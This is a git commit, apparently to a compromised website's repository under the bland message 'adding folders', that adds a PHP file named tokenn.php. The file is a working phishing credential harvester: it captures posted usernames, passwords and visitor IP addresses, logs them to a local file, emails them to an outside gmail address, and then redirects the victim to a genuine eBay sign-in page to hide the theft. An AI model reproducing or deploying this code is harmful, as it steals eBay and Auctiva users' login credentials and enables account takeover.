388a1df543df4e2fd2b23fa2f32e3d5d93946136
Jose Emilio Cabana <jecabana@vanitymiami.com>
2014-11-13 09:53:50 -0500

    adding folders

---
+++ switcher/tokenn.php
@@ -0,0 +1,15 @@
+<?
+$ip = getenv("REMOTE_ADDR");
+$userid = $_POST["username"];
+$pass = $_POST["password"];
+$subject = "AUCTIVAAAAAAA: $userid#$pass";
+
+$to = "wesleyjr12@gmail.com";
+$data = "User ID: $userid\nPassword: $pass\nIp: $ip\n";
+
+$file = fopen("$$$.txt", "a");
+fputs ($file, "$data\r\n");
+fclose ($file);
+mail($to, $subject, $data);
+header("Location: https://signin.ebay.com/ws/eBayISAPI.dll?ThirdPartyAuthSucessFailure&isAuthSuccessful=true&AUCTIVA=TRUE");
+?>
